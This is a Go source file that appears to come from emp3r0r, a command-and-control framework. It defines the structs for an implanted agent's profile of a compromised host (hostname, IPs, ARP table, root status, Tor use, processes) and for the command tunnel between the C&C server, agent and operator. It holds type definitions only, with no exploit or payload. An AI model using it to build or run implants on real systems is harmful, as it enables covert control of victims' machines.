package def

import (
	"context"

	"github.com/jaypipes/ghw"
	"github.com/posener/h2conn"
)

// Emp3r0rAgent agent properties
type Emp3r0rAgent struct {
	Tag		string			`cbor:"1,keyasint"`	// identifier of the agent
	Name		string			`cbor:"2,keyasint"`	// short name of the agent
	Version		string			`cbor:"3,keyasint"`	// agent version
	Transport	string			`cbor:"4,keyasint"`	// transport the agent uses (HTTP2 / CDN / TOR)
	Hostname	string			`cbor:"5,keyasint"`	// Hostname and machine ID
	Hardware	string			`cbor:"6,keyasint"`	// machine details and hypervisor
	Container	string			`cbor:"7,keyasint"`	// container tech (if any)
	CPU		string			`cbor:"8,keyasint"`	// CPU info
	GPU		string			`cbor:"9,keyasint"`	// GPU info
	Mem		string			`cbor:"10,keyasint"`	// memory size
	OS		string			`cbor:"11,keyasint"`	// OS name and version
	GOOS		string			`cbor:"12,keyasint"`	// runtime.GOOS
	Kernel		string			`cbor:"13,keyasint"`	// kernel release
	Arch		string			`cbor:"14,keyasint"`	// kernel architecture
	From		string			`cbor:"15,keyasint"`	// where the agent is coming from, usually a public IP, or 127.0.0.1
	IPs		[]string		`cbor:"16,keyasint"`	// IPs that are found on target's NICs
	ARP		[]string		`cbor:"17,keyasint"`	// ARP table
	User		string			`cbor:"18,keyasint"`	// user account info
	HasRoot		bool			`cbor:"19,keyasint"`	// is agent run as root?
	HasTor		bool			`cbor:"20,keyasint"`	// is agent from Tor?
	HasInternet	bool			`cbor:"21,keyasint"`	// has internet access?
	NCSIEnabled	bool			`cbor:"22,keyasint"`	// NCSI (or similar services) enabled
	Process		*AgentProcess		`cbor:"23,keyasint"`	// agent's process
	Exes		[]string		`cbor:"24,keyasint"`	// executables found in agent's $PATH
	CWD		string			`cbor:"25,keyasint"`	// current working directory
	Product		*ghw.ProductInfo	`cbor:"26,keyasint"`	// product info
	UUID		string			`cbor:"27,keyasint"`	// agent UUID, specific to the agent binary
	UUIDSig		string			`cbor:"28,keyasint"`	// signature of UUID, signed by CA
}

// AgentProcess process info of our agent
type AgentProcess struct {
	PID	int	`cbor:"1,keyasint"`	// pid
	PPID	int	`cbor:"2,keyasint"`	// parent PID
	Cmdline	string	`cbor:"3,keyasint"`	// process name and command line args
	Parent	string	`cbor:"4,keyasint"`	// parent process name and cmd line args
}

// MsgTunData data to send in the tunnel, between C&C and agent
// this can also be used for operator to CC communication
type MsgTunData struct {
	CmdID		string		`cbor:"1,keyasint"`	// command ID, to retrieve the response, or empty if not a command
	CmdSlice	[]string	`cbor:"2,keyasint"`	// command args, [0] is the command, or empty if not a command
	Response	[]byte		`cbor:"3,keyasint"`	// response from the agent, or message to operator
	Tag		string		`cbor:"4,keyasint"`	// tag of the agent, or message type if sent to operator
	Time		string		`cbor:"5,keyasint"`	// timestamp
}

// H2Conn add context to h2conn.Conn
type H2Conn struct {
	Conn	*h2conn.Conn
	Ctx	context.Context
	Cancel	context.CancelFunc
}
